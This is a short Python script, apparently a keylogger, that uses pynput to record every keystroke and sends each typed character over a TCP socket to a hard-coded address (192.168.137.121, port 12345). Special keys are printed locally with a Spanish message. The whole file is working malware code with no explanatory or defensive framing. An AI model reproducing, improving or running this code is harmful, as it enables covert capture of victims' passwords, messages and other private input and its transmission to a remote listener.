import socket
from pynput import keyboard

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('192.168.137.121', 12345))

def on_press(key):
    try:
        client_socket.sendall(key.char.encode('utf-8'))
    except AttributeError:
        print(f"Tecla especial presionada: {key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

client_socket.close()
